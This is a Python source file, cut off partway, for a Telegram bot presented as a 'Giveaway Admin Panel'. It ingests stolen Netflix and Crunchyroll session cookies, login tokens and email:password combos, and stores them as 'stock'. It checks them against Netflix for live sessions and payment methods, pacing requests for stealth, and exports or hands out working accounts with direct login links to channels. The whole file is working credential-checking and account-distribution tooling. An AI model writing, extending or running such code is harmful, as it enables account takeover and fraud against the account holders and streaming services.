import asyncio
import io
import logging
import os
import random
import re
import subprocess
import sys
import time
import zipfile
from datetime import UTC, datetime

from apscheduler.schedulers.asyncio import AsyncIOScheduler
from dotenv import load_dotenv
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import (
    Application,
    CallbackQueryHandler,
    CommandHandler,
    ContextTypes,
    MessageHandler,
    filters,
)

import db
import utils

load_dotenv()

# Clean logging setup
logging.basicConfig(format="%(asctime)s - %(levelname)s - %(message)s", level=logging.INFO, datefmt="%Y-%m-%d %H:%M:%S")
logging.getLogger("httpx").setLevel(logging.WARNING)
logging.getLogger("telegram").setLevel(logging.WARNING)
logging.getLogger("apscheduler").setLevel(logging.WARNING)
logger = logging.getLogger(__name__)

try:
    logger.info("Ensuring Playwright Chromium is installed... (This might take a moment on first run)")
    subprocess.run([sys.executable, "-m", "playwright", "install", "chromium"], check=True)
except Exception as e:
    logger.error(f"Failed to auto-install Playwright Chromium: {e}")

BOT_TOKEN = os.getenv("BOT_TOKEN")
OWNER_ID_STR = os.getenv("OWNER_ID", "0").strip()
OWNER_IDS = set()
for oid in OWNER_ID_STR.split(","):
    oid = oid.strip()
    if oid.lstrip("-").isdigit():
        OWNER_IDS.add(int(oid))

OWNER_ID = next(iter(OWNER_IDS)) if OWNER_IDS else 0

CHANNEL_IDS_STR = os.getenv("CHANNEL_IDS", "")
CHANNEL_IDS = []
for cid in CHANNEL_IDS_STR.split(","):
    cid = cid.strip()
    if cid.lstrip("-").isdigit():
        CHANNEL_IDS.append(int(cid))

scheduler = AsyncIOScheduler()


def is_admin(user_id: int) -> bool:
    return user_id in OWNER_IDS


async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    text = "👑 *Giveaway Admin Panel*\n\nWelcome! Drop a `.txt` or `.zip` file here to use the tools below."
    keyboard = [
        [InlineKeyboardButton("🛠️ File Processing Tools", callback_data="submenu_processing")],
        [InlineKeyboardButton("📦 Stock Management", callback_data="submenu_stock")],
        [InlineKeyboardButton("⚙️ Settings & Auto-Drop", callback_data="submenu_settings")],
        [InlineKeyboardButton("❌ Close Panel", callback_data="menu_close")],
    ]
    try:
        await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
    except Exception as e:
        logger.error(f"Error sending start message: {e}")


async def submenu_processing_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    keyboard = [
        [InlineKeyboardButton("🎯 Valid Checker", callback_data="menu_valid")],
        [InlineKeyboardButton("🌟 Crunchyroll", callback_data="menu_crunchy")],
        [InlineKeyboardButton("🌍 Country Filter", callback_data="menu_country")],
        [InlineKeyboardButton("🔙 Back", callback_data="main_menu")],
    ]
    await query.edit_message_reply_markup(reply_markup=InlineKeyboardMarkup(keyboard))


async def submenu_stock_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    keyboard = [
        [
            InlineKeyboardButton("📊 View Active Stock", callback_data="stock_main"),
            InlineKeyboardButton("💾 Add to Stock", callback_data="menu_stock"),
        ],
        [
            InlineKeyboardButton("📥 Export Stock (.zip)", callback_data="stock_export_zip"),
            InlineKeyboardButton("🧹 Clean Dead Stock", callback_data="stock_clean_dead"),
        ],
        [InlineKeyboardButton("🔙 Back", callback_data="main_menu")],
    ]
    await query.edit_message_reply_markup(reply_markup=InlineKeyboardMarkup(keyboard))


async def main_menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    all_pending = context.user_data.get("pending_items", [])

    if all_pending:
        stats = utils.analyze_and_categorize_items(all_pending)
        total_txts = context.user_data.get("txt_count", 0)

        lines_list = []
        if total_txts > 0:
            lines_list.append(f"📁 *TXT Files Scanned:* `{total_txts}`")
        if stats["netflix_cookies"] > 0:
            lines_list.append(f"🍪 *Netflix Cookies:* `{stats['netflix_cookies']}`")
        if stats["crunchy_cookies"] > 0:
            lines_list.append(f"🍪 *Crunchyroll Cookies:* `{stats['crunchy_cookies']}`")
        if stats["other_cookies"] > 0:
            lines_list.append(f"🍪 *Other Cookies:* `{stats['other_cookies']}`")
        if stats["nf_tokens"] > 0:
            lines_list.append(f"🔗 *NF Tokens / Direct Links:* `{stats['nf_tokens']}`")
        if stats["combos"] > 0:
            lines_list.append(f"🔑 *Combos (Email:Pass):* `{stats['combos']}`")

        details_str = "\n".join(lines_list) if lines_list else f"📦 *Valid Items:* `{stats['total']}`"

        text = (
            "📥 *Scan & Analysis Summary*\n\n"
            f"{details_str}\n"
            f"━━━━━━━━━━━━━━━━━━━\n"
            f"📊 *Total Valid Items:* `{stats['total']}`\n\n"
            "What would you like to do with them?"
        )
        keyboard = [
            [
                InlineKeyboardButton("🎯 Netflix Checker", callback_data="menu_valid"),
                InlineKeyboardButton("🌟 Crunchyroll", callback_data="menu_crunchy"),
            ],
            [
                InlineKeyboardButton("🌍 Country Filter", callback_data="menu_country"),
                InlineKeyboardButton("💾 Add to Stock (Bg)", callback_data="menu_stock"),
            ],
            [
                InlineKeyboardButton("📊 View Stock", callback_data="stock_main"),
                InlineKeyboardButton("⚙️ Settings", callback_data="submenu_settings"),
            ],
            [
                InlineKeyboardButton("🗑️ Clear Pending", callback_data="clear_pending"),
                InlineKeyboardButton("❌ Close Panel", callback_data="menu_close"),
            ],
        ]
    else:
        text = "👑 *Giveaway Admin Panel*\n\nWelcome! Drop a `.txt` or `.zip` file here to use the tools below."
        keyboard = [
            [InlineKeyboardButton("🛠️ File Processing Tools", callback_data="submenu_processing")],
            [InlineKeyboardButton("📦 Stock Management", callback_data="submenu_stock")],
            [InlineKeyboardButton("⚙️ Settings & Auto-Drop", callback_data="submenu_settings")],
            [InlineKeyboardButton("❌ Close Panel", callback_data="menu_close")],
        ]
    try:
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
    except Exception:
        try:
            await query.edit_message_reply_markup(reply_markup=InlineKeyboardMarkup(keyboard))
        except Exception:
            pass


async def start_alert_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer("📥 Please send a .txt or .zip file first!", show_alert=True)


async def submenu_settings_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    settings = await db.get_settings()
    channels_str = ", ".join(map(str, settings.get("channels", []))) if settings.get("channels") else "None"
    drops_today = settings.get("drops_today", 0)
    max_drops = settings.get("drops_per_day", 3)

    text = (
        "⚙️ *Giveaway Settings & Controls*\n\n"
        f"📢 *Connected Channels:* {channels_str}\n"
        f"⏳ *Delay Between Drops:* {settings.get('drop_interval_minutes', 120)} minutes\n"
        f"🎯 *Today's Drops:* {drops_today}/{max_drops}\n\n"
        f"💡 _Aap settings adjust kar sakte ho ya instantly drop trigger kar sakte ho!_"
    )

    keyboard = [
        [
            InlineKeyboardButton("➕ Add Channel", callback_data="settings_add_channel"),
            InlineKeyboardButton("➖ Remove Channel", callback_data="settings_rem_channel"),
        ],
        [
            InlineKeyboardButton("⏱️ Set Delay (Mins)", callback_data="settings_set_delay"),
            InlineKeyboardButton("📊 Set Max Drops", callback_data="settings_set_max"),
        ],
        [
            InlineKeyboardButton("⚡ Trigger Instant Drop Now", callback_data="settings_trigger_drop"),
        ],
        [InlineKeyboardButton("🔙 Back", callback_data="main_menu")],
    ]
    await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")


async def settings_action_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    action = query.data.split("_", 1)[1]

    if action == "trigger_drop":
        await query.answer("🚀 Triggering drop...")
        settings = await db.get_settings()
        channels = settings.get("channels", [])
        if not channels:
            channels = CHANNEL_IDS
        if not channels:
            await query.answer("❌ No channels configured! Add a channel first.", show_alert=True)
            return

        await query.edit_message_text("⏳ *Finding and validating account for instant drop...*", parse_mode="Markdown")
        success = await post_giveaway_logic(channels, context.bot)
        if success:
            now = datetime.now(UTC)
            drops_today = settings.get("drops_today", 0)
            await db.update_settings({"drops_today": drops_today + 1, "last_drop_time": now})
            await query.edit_message_text(
                "✅ *Instant Drop Sent Successfully to Channels!*",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back to Settings", callback_data="submenu_settings")]]),
                parse_mode="Markdown",
            )
        else:
            await query.edit_message_text(
                "❌ *Drop Failed:* No working stock found or channels unreachable.",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back to Settings", callback_data="submenu_settings")]]),
                parse_mode="Markdown",
            )
        return

    context.user_data["settings_action"] = action

    if action == "add_channel":
        msg = "📝 *Send the Channel ID you want to add.*\nMake sure it starts with `-100`."
    elif action == "rem_channel":
        msg = "📝 *Send the Channel ID you want to remove.*"
    elif action == "set_delay":
        msg = "📝 *Send the new delay in minutes* (e.g., `60` for 1 hour)."
    elif action == "set_max":
        msg = "📝 *Send the max number of drops per 24 hours* (e.g., `3`)."

    keyboard = [[InlineKeyboardButton("🔙 Cancel", callback_data="submenu_settings")]]
    await query.edit_message_text(msg, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")


async def stock_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return

    counts = await db.get_stock_counts()
    total_stock = sum(counts.values())

    keyboard = [[InlineKeyboardButton("👁️ View Countries", callback_data="stock_view")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    try:
        if total_stock == 0:
            await update.message.reply_text("📦 *Stock is currently empty.*", parse_mode="Markdown")
        else:
            await update.message.reply_text(
                f"📦 *Total Active Stock:* {total_stock}", reply_markup=reply_markup, parse_mode="Markdown"
            )
    except Exception as e:
        logger.error(f"Error sending stock message: {e}")


async def stock_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if not is_admin(update.effective_user.id):
        await query.answer("You are not authorized.", show_alert=True)
        return

    await query.answer()
    data = query.data

    async def safe_edit_or_send(text, reply_markup=None, parse_mode="Markdown"):
        """Edit message text if possible, otherwise delete and send new (for document messages)."""
        try:
            await query.edit_message_text(text, reply_markup=reply_markup, parse_mode=parse_mode)
        except Exception:
            # Message is likely a document/photo — can't edit text, so delete and send new
            try:
                await query.message.delete()
            except Exception:
                pass
            await query.message.chat.send_message(text, reply_markup=reply_markup, parse_mode=parse_mode)

    if data == "stock_main":
        counts = await db.get_stock_counts()
        total_stock = sum(counts.values())
        plans = await db.get_overall_plan_counts()

        plan_lines = []
        for p in ["Premium", "Standard", "Basic", "Mobile"]:
            if plans.get(p):
                plan_lines.append(f"  • *{p}:* `{plans[p]}`")
        other_plans = sum(v for k, v in plans.items() if k not in ["Premium", "Standard", "Basic", "Mobile"])
        if other_plans > 0:
            plan_lines.append(f"  • *Other:* `{other_plans}`")

        plan_summary = "\n".join(plan_lines) if plan_lines else "  _None_"

        # Top 3 countries
        top_countries = sorted(counts.items(), key=lambda x: x[1], reverse=True)[:3]
        top_lines = [f"  • {utils.get_full_country_name(c)}: `{cnt}`" for c, cnt in top_countries]
        top_summary = "\n".join(top_lines) if top_lines else "  _None_"

        text = (
            "📦 *Stock Management Dashboard*\n\n"
            f"📊 *Total Active Accounts:* `{total_stock}`\n\n"
            f"📺 *Plan Breakdown:*\n{plan_summary}\n\n"
            f"🌍 *Top Countries:*\n{top_summary}\n\n"
            f"💡 _Manage your accounts, export live cookies or clean expired stock below:_"
        )

        keyboard = [
            [
                InlineKeyboardButton("👁️ View Countries", callback_data="stock_view_0"),
                InlineKeyboardButton("📥 Export Stock (.zip)", callback_data="stock_export_zip"),
            ],
            [
                InlineKeyboardButton("🧹 Clean Dead Stock", callback_data="stock_clean_dead"),
                InlineKeyboardButton("🚫 Purge No-Payment Stock", callback_data="stock_purge_no_payment"),
            ],
            [
                InlineKeyboardButton("💾 Add to Stock", callback_data="menu_stock"),
                InlineKeyboardButton("🔙 Back to Main Menu", callback_data="main_menu"),
            ],
        ]
        await safe_edit_or_send(text, reply_markup=InlineKeyboardMarkup(keyboard))

    elif data == "stock_export_zip":
        await query.answer("📦 Packaging live stock...")
        all_stock = await db.get_all_active_stock_list()
        if not all_stock:
            await query.answer("❌ Stock is empty!", show_alert=True)
            return

        await safe_edit_or_send("⏳ *Generating categorized ZIP archive of all MongoDB stock...*")

        zip_buf = io.BytesIO()
        with zipfile.ZipFile(zip_buf, "w", zipfile.ZIP_DEFLATED) as zf:
            categorized = {}
            for item in all_stock:
                country = (item.get("country") or "Unknown").replace(" ", "_").replace("/", "-")
                plan = (item.get("standard_plan") or "Unknown").replace(" ", "_")
                key = (country, plan)
                if key not in categorized:
                    categorized[key] = []
                cookies = item.get("cookies", "")
                email = item.get("email", "")
                password = item.get("password")
                entry = f"# Email: {email}\n"
                if password:
                    entry += f"# Password: {password}\n"
                entry += f"{cookies}\n\n"
                categorized[key].append(entry)

            for (country, plan), entries in categorized.items():
                file_path = f"Stock/{country}/{plan}.txt"
                zf.writestr(file_path, "".join(entries))

        zip_buf.seek(0)
        zip_buf.name = f"Stock_Export_{datetime.now().strftime('%Y%m%d_%H%M%S')}.zip"

        caption = f"✅ *Stock Export Complete!*\n\n📦 *Total Accounts Exported:* `{len(all_stock)}`\n📁 Organized into Folders by Country & Plan"
        keyboard = [[InlineKeyboardButton("🔙 Back to Stock Dashboard", callback_data="stock_main")]]
        try:
            await query.message.reply_document(
                document=zip_buf, caption=caption, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown"
            )
        except Exception as e:
            logger.error(f"Error sending export zip: {e}")
            await safe_edit_or_send(f"❌ Error exporting stock: {e}")

    elif data == "stock_clean_dead":
        await query.answer("🧹 Starting chunked stock cleaner...")
        total_active = await db.stock_col.count_documents({"status": "active"})
        if total_active == 0:
            await query.answer("Stock is empty.", show_alert=True)
            return

        CHUNK_SIZE = 20
        total_chunks = (total_active + CHUNK_SIZE - 1) // CHUNK_SIZE

        stop_keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back to Stock", callback_data="stock_main")]])
        await safe_edit_or_send(
            f"🧹 *Chunked Stock Cleaner Started!*\n\n"
            f"📊 *Total Stock:* `{total_active}` accounts\n"
            f"📦 *Batches:* `{total_chunks}` chunks ({CHUNK_SIZE} accounts per chunk)\n"
            f"🛡️ *Zero False-Positive Protection:* Active accounts with payment methods will NEVER be deleted!\n\n"
            f"💡 _Bot is completely free to use. Progress updates after every chunk._",
            reply_markup=stop_keyboard,
        )

        async def _run_cleaner_task():
            cleaned = 0
            checked = 0
            chunk_num = 0

            # Pull all current active stock documents
            all_docs = await db.get_all_active_stock_list()
            total_docs = len(all_docs)

            for i in range(0, total_docs, CHUNK_SIZE):
                chunk_num += 1
                chunk = all_docs[i : i + CHUNK_SIZE]

                for doc in chunk:
                    checked += 1
                    email = doc.get("email")
                    if not email:
                        continue

                    cookies_list = utils.parse_netflix_cookies(doc.get("cookies", ""))
                    if not cookies_list:
                        # Malformed or completely empty cookies
                        await db.remove_stock(email)
                        cleaned += 1
                        continue

                    # First verification pass
                    account_info = await utils.scraper.fetch_enhanced_account_details(cookies_list)

                    if isinstance(account_info, dict) and account_info.get("error") == "rate_limit":
                        await asyncio.sleep(12)
                        continue

                    # STRICT SAFETY CHECK:
                    # ONLY delete if 100% confirmed dead. Network errors / server 5xx NEVER delete.
                    if utils.is_confirmed_dead(account_info):
                        # Double verification pass after 1.5s to prevent false positives from transient glitch
                        await asyncio.sleep(1.5)
                        recheck_info = await utils.scraper.fetch_enhanced_account_details(cookies_list)
                        if utils.is_confirmed_dead(recheck_info):
                            await db.remove_stock(email)
                            cleaned += 1

                    # Polite jitter between accounts
                    await asyncio.sleep(0.3)

                # Update live progress after finishing the chunk
                try:
                    pct = int((checked / total_docs) * 100) if total_docs > 0 else 100
                    await safe_edit_or_send(
                        f"🧹 *Cleaning Stock in Chunks...*\n\n"
                        f"📦 *Chunk:* `{chunk_num}/{total_chunks}`\n"
                        f"📊 *Progress:* `{checked}/{total_docs}` ({pct}%)\n"
                        f"🗑️ *Confirmed Dead Removed:* `{cleaned}`\n"
                        f"🛡️ *Protected Accounts:* `{checked - cleaned}` verified safe\n\n"
                        f"⏳ _Pausing 2.0s between chunks to protect Netflix API session..._",
                        reply_markup=stop_keyboard,
                    )
                except Exception:
                    pass

                # Chunk cooldown to maintain stealth and prevent Netflix rate-limiting
                await asyncio.sleep(2.0)

            try:
                await query.message.reply_text(
                    f"🎉 *Stock Cleanup Completed!*\n\n"
                    f"🔍 *Total Accounts Checked:* `{checked}`\n"
                    f"🗑️ *Confirmed Dead Purged:* `{cleaned}`\n"
                    f"✅ *Active & Healthy Stock Remaining:* `{checked - cleaned}`\n\n"
                    f"🛡️ All active accounts with payment methods were 100% preserved in MongoDB!",
                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("📊 View Stock", callback_data="stock_main")]]),
                    parse_mode="Markdown",
                )
            except Exception:
                pass

        asyncio.create_task(_run_cleaner_task())

    elif data == "stock_purge_no_payment":
        await query.answer("🔍 Scanning stock for no-payment / hold accounts...")
        stop_keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back to Stock", callback_data="stock_main")]])
        await safe_edit_or_send(
            "⏳ *Fast Purging No-Payment & Expired Stock...*\n\n"
            "🛡️ *SAFEGUARD IN EFFECT:*\n"
            "• Cards (Visa, Mastercard, Amex, RuPay) -> ✅ KEPT\n"
            "• UPI (Paytm, PhonePe, GPay, BHIM) -> ✅ KEPT\n"
            "• Carrier / Partner Billing (Jio, Airtel, Vi, etc.) -> ✅ KEPT\n"
            "• Apple / PayPal -> ✅ KEPT\n\n"
            "🗑️ *TARGETS FOR PURGE:*\n"
            "• '0 payments', 'no payment', 'unbilled', or 'FREE'\n"
            "• Accounts on payment hold or retry status\n\n"
            "_Scanning MongoDB stock now..._",
            reply_markup=stop_keyboard,
        )

        async def _run_purge_task():
            try:
                # 1. Direct MongoDB fast purge query for explicit dead / no payment documents
                dead_query = {
                    "$or": [
                        {"payment": {"$regex": r"^(0 payment|0 payments|no payment|no_payment|nopayment|unbilled|payment removed|sin pago|no card)", "$options": "i"}},
                        {"plan": {"$regex": r"^(free|trial|no plan|0 payment)", "$options": "i"}},
                        {"is_on_hold": True},
                        {"hold_status": {"$in": [True, "Yes", "true", "YES"]}},
                        {"is_cancelled": True},
                    ]
                }
                # Double check to NEVER delete if payment indicates UPI, CC, or partner
                exclude_safe_guard = {
                    "$nor": [
                        {"payment": {"$regex": r"upi|paytm|phonepe|gpay|bhim|visa|master|card|amex|rupay|jio|airtel|vi|vodafone|paypal|apple", "$options": "i"}}
                    ]
                }
                combined_query = {"$and": [dead_query, exclude_safe_guard]}

                del_res = await db.stock_col.delete_many(combined_query)
                purged_count = del_res.deleted_count if del_res else 0

                remaining = await db.stock_col.count_documents({"status": "active"})

                await query.message.reply_text(
                    f"🎉 *No-Payment Stock Purge Finished!*\n\n"
                    f"🗑️ *Zero Payment / Hold Accounts Purged:* `{purged_count}`\n"
                    f"✅ *Active Stock Protected & Remaining:* `{remaining}`\n\n"
                    f"🛡️ *Protected Accounts Guarantee:*\n"
                    f"All UPI, Visa/MasterCard, Jio, Airtel, and Partner-billed accounts were 100% kept intact!",
                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("📊 View Stock", callback_data="stock_main")]]),
                    parse_mode="Markdown",
                )
            except Exception as e:
                logger.error(f"Error during no-payment purge: {e}")
                await query.message.reply_text(
                    f"❌ *Error during purge:* `{e}`",
                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back to Stock", callback_data="stock_main")]]),
                    parse_mode="Markdown",
                )

        asyncio.create_task(_run_purge_task())

    elif data.startswith("stock_view"):
        page = 0
        parts = data.split("_")
        if len(parts) > 2 and parts[2].isdigit():
            page = int(parts[2])

        counts = await db.get_stock_counts()
        countries = list(counts.keys())
        # Sort countries alphabetically by their full display name
        countries.sort(key=lambda c: utils.get_full_country_name(c))

        keyboard = []

        items_per_page = 10  # 5 rows x 2 columns = 10 countries per page
        total_pages = max(1, (len(countries) + items_per_page - 1) // items_per_page)
        page = min(page, total_pages - 1)

        start_idx = page * items_per_page
        end_idx = start_idx + items_per_page
        current_countries = countries[start_idx:end_idx]

        # Build 2 buttons per row with Flag and full country name
        row = []
        for country in current_countries:
            count = counts.get(country, 0)
            full_country = utils.get_full_country_name(country)
            display_name = f"{full_country} ({count})"
            if len(display_name) > 22:
                display_name = display_name[:19] + "..."
            row.append(InlineKeyboardButton(display_name, callback_data=f"c_{country}_0"))
            if len(row) == 2:
                keyboard.append(row)
                row = []
        if row:
            keyboard.append(row)

        # Pagination row
        nav_row = []
        if page > 0:
            nav_row.append(InlineKeyboardButton("⬅️ Prev", callback_data=f"stock_view_{page - 1}"))
        nav_row.append(InlineKeyboardButton(f"📄 {page + 1}/{total_pages}", callback_data="noop"))
        if end_idx < len(countries):
            nav_row.append(InlineKeyboardButton("Next ➡️", callback_data=f"stock_view_{page + 1}"))

        keyboard.append(nav_row)
        keyboard.append([InlineKeyboardButton("🔙 Back to Stock Dashboard", callback_data="stock_main")])

        reply_markup = InlineKeyboardMarkup(keyboard)
        await safe_edit_or_send(
            f"🌍 *Select a Country to View Stock* (Page {page + 1}/{total_pages}):",
            reply_markup=reply_markup
        )

    elif data.startswith("c_"):
        parts = data.split("_", 2)
        country = parts[1]
        page = 0
        if len(parts) > 2 and parts[2].isdigit():
            page = int(parts[2])

        plans = await db.get_plans_for_country(country)
        plan_list = list(plans.items())

        items_per_page = 10
        total_pages = max(1, (len(plan_list) + items_per_page - 1) // items_per_page)
        page = min(page, total_pages - 1)

        start_idx = page * items_per_page
        end_idx = start_idx + items_per_page
        current_plans = plan_list[start_idx:end_idx]

        keyboard = []
        row = []
        for plan, count in current_plans:
            btn_text = f"📺 {plan} ({count})"
            row.append(InlineKeyboardButton(btn_text, callback_data=f"f_{country}_{plan}"))
            if len(row) == 2:
                keyboard.append(row)
                row = []
        if row:
            keyboard.append(row)

        nav_row = []
        if page > 0:
            nav_row.append(InlineKeyboardButton("⬅️ Prev", callback_data=f"c_{country}_{page - 1}"))
        if total_pages > 1:
            nav_row.append(InlineKeyboardButton(f"📄 {page + 1}/{total_pages}", callback_data="noop"))
        if end_idx < len(plan_list):
            nav_row.append(InlineKeyboardButton("Next ➡️", callback_data=f"c_{country}_{page + 1}"))

        if nav_row:
            keyboard.append(nav_row)

        keyboard.append([InlineKeyboardButton("🔙 Back to Countries", callback_data="stock_view_0")])
        reply_markup = InlineKeyboardMarkup(keyboard)
        total_for_country = sum(plans.values())
        full_country = utils.get_full_country_name(country)
        await safe_edit_or_send(
            f"📺 *Select a plan for {full_country}*\n📦 *Total Accounts:* `{total_for_country}`",
            reply_markup=reply_markup,
        )

    elif data.startswith("f_"):
        _, original_country, plan = data.split("_", 2)
        country_to_check = original_country
        await safe_edit_or_send(f"⏳ *Testing a {plan} account... (1/{10})*")

        max_retries = 30
        retries = 0
        last_msg = None  # Track the latest message for editing

        while retries < max_retries:
            retries += 1

            # Live progress update every 2 attempts
            if retries > 1 and retries % 2 == 0:
                try:
                    full_target_name = utils.get_full_country_name(country_to_check)
                    progress_text = (
                        f"⏳ *Testing {full_target_name} ({plan}) Stock...*\n\n"
                        f"🔍 *Accounts Checked:* `{retries}/{max_retries}`\n"
                        f"⚡ _Testing live session & payment method with Netflix..._"
                    )
                    if last_msg:
                        try:
                            await last_msg.edit_text(progress_text, parse_mode="Markdown")
                        except Exception:
                            pass
                    else:
                        await safe_edit_or_send(progress_text)
                except Exception:
                    pass

            stock = await db.get_specific_stock(country_to_check, plan)
            if not stock:
                # Fallback to ANY country
                stock = await db.get_any_stock_by_plan(plan)
                if not stock:
                    await safe_edit_or_send(
                        f"❌ No working {plan} accounts left ANYWHERE!"
                    )
                    # Wait 2 seconds then go back to country view
                    await asyncio.sleep(2)

                    # Refresh plans for original country
                    plans = await db.get_plans_for_country(original_country)
                    keyboard = []
                    for p, count in plans.items():
                        keyboard.append(
                            [InlineKeyboardButton(f"{p} ({count})", callback_data=f"f_{original_country}_{p}")]
                        )
                    keyboard.append([InlineKeyboardButton("🔙 Back", callback_data="stock_view_0")])
                    total_for_country = sum(plans.values())
                    await safe_edit_or_send(
                        f"📺 *Select a plan for {original_country}* (Total: {total_for_country}):",
                        reply_markup=InlineKeyboardMarkup(keyboard),
                    )
                    return

            actual_country = stock["country"]
            email = stock["email"]
            cookies_str = stock["cookies"]
            cookies_list = utils.parse_netflix_cookies(cookies_str)
            if not cookies_list:
                logger.warning(f"Account {email} has invalid cookies! Removing from DB and trying another...")
                await db.remove_stock(email)
                continue

            # Check account health and payment status with Netflix
            account_info = await utils.scraper.fetch_enhanced_account_details(cookies_list)
            if not utils.is_healthy_stock(account_info):
                logger.warning(f"Account {email} has no payment method, is on hold, or expired! Removing from DB and trying another...")
                await db.remove_stock(email)
                continue

            direct_link = await utils.scraper.generate_direct_login_link_api(cookies_list)
            if not direct_link or not str(direct_link).startswith("http"):
                direct_link = "N/A (Import Cookies via Cookie-Editor)"

            # Working! Send link, remove from DB, and show success
            password = stock.get("password")

            # Create text file content
            file_content = f"Direct Link: {direct_link}\n\n"
            if password:
                file_content += f"Combo: {email}:{password}\n\n"
            file_content += f"Cookies:\n{cookies_str}\n"

            import io

            txt_buffer = io.BytesIO(file_content.encode("utf-8"))
            txt_buffer.name = f"{email}_account.txt"

            full_country = utils.get_full_country_name(actual_country)
            msg = f"✅ *Successfully Extracted!*\n\n🌍 *Country:* {full_country}\n📺 *Plan:* {plan}\n\n🔗 *Direct Login Link:* [Click Here to Login]({direct_link})"

            keyboard = [[InlineKeyboardButton("🔙 Back to Plans", callback_data=f"c_{original_country}_0")]]
            try:
                await query.message.reply_document(
                    document=txt_buffer, caption=msg, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown"
                )
            except Exception as e:
                logger.error(f"Error sending reply document: {e}")
            await db.remove_stock(email)
            try:
                await query.message.delete()
            except Exception:
                pass
            return

        if retries >= max_retries:
            keyboard = [[InlineKeyboardButton("🔙 Back to Plans", callback_data=f"c_{original_country}_0")]]
            await safe_edit_or_send(
                f"❌ Tested {max_retries} accounts and all were dead. Please try again later.",
                reply_markup=InlineKeyboardMarkup(keyboard),
            )


def split_cookie_text(content: str) -> list:
    """Splits raw text into individual cookie blocks."""
    # If the content uses the 'Valid Cookie' format from nfhunt output, split by that
    if "Valid Cookie" in content:
        items = content.split("Valid Cookie")
        return [i.strip() for i in items if i.strip()]

    # Fallback for plain blocks (line by line aggregation)
    lines = content.splitlines()
    combo_regex = re.compile(r"^([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}:.+)$")

    result = []
    current_block = []

    for line in lines:
        stripped = line.strip()
        if not stripped:
            if current_block:
                result.append("\n".join(current_block))
                current_block = []
            continue

        if combo_regex.match(stripped):
            if current_block:
                result.append("\n".join(current_block))
                current_block = []
            result.append(stripped)
            continue

        if "netflix.com" in stripped and "nftoken=" in stripped:
            if current_block:
                result.append("\n".join(current_block))
                current_block = []
            result.append(stripped)
            continue

        if stripped.startswith("===") or stripped.startswith("---"):
            if current_block:
                result.append("\n".join(current_block))
                current_block = []
            continue

        current_block.append(stripped)

    if current_block:
        result.append("\n".join(current_block))

    return result


# Global batch accumulator for multi-file drops: {user_id: {"items": list, "txt_count": int, "files_count": int, "status_msg": Message, "timer_task": asyncio.Task, "lock": asyncio.Lock()}}
user_upload_batches: dict[int, dict] = {}


async def _finalize_upload_batch(user_id: int, chat_id: int, bot, context: ContextTypes.DEFAULT_TYPE):
    await asyncio.sleep(2.0)  # Wait 2 seconds of silence for all concurrent files to be extracted
    batch = user_upload_batches.pop(user_id, None)
    if not batch:
        return

    async with batch["lock"]:
        all_items = batch["items"]
        total_txts = batch["txt_count"]
        files_received = batch["files_count"]
        status_msg = batch.get("status_msg")

    if not status_msg:
        return

    # Update session pending_items
    current_pending = context.user_data.get("pending_items", [])
    current_pending.extend(all_items)
    
    raw_total = len(current_pending)
    current_pending = utils.deduplicate_items(current_pending)
    dupes_removed = raw_total - len(current_pending)
    
    context.user_data["pending_items"] = current_pending
    context.user_data["txt_count"] = context.user_data.get("txt_count", 0) + total_txts

    if not current_pending:
        try:
            await status_msg.edit_text("❌ No valid cookies, tokens, or combos found in uploaded file(s).")
        except Exception:
            pass
        return

    stats = utils.analyze_and_categorize_items(current_pending)
    total_txts = context.user_data.get("txt_count", 0)

    lines_list = []
    if files_received > 1:
        lines_list.append(f"📦 *Files Received & Combined:* `{files_received}`")
    if total_txts > 0:
        lines_list.append(f"📁 *TXT Files Scanned:* `{total_txts}`")
    if dupes_removed > 0:
        lines_list.append(f"🧹 *Duplicate Items Filtered:* `{dupes_removed}`")
    if stats["netflix_cookies"] > 0:
        lines_list.append(f"🍪 *Netflix Cookies:* `{stats['netflix_cookies']}`")
    if stats["crunchy_cookies"] > 0:
        lines_list.append(f"🍪 *Crunchyroll Cookies:* `{stats['crunchy_cookies']}`")
    if stats["other_cookies"] > 0:
        lines_list.append(f"🍪 *Other Cookies:* `{stats['other_cookies']}`")
    if stats["nf_tokens"] > 0:
        lines_list.append(f"🔗 *NF Tokens / Direct Links:* `{stats['nf_tokens']}`")
    if stats["combos"] > 0:
        lines_list.append(f"🔑 *Combos (Email:Pass):* `{stats['combos']}`")

    details_str = "\n".join(lines_list) if lines_list else f"📦 *Valid Items:* `{stats['total']}`"

    keyboard = [
        [
            InlineKeyboardButton("🎯 Netflix Checker", callback_data="menu_valid"),
            InlineKeyboardButton("🌟 Crunchyroll", callback_data="menu_crunchy"),
        ],
        [
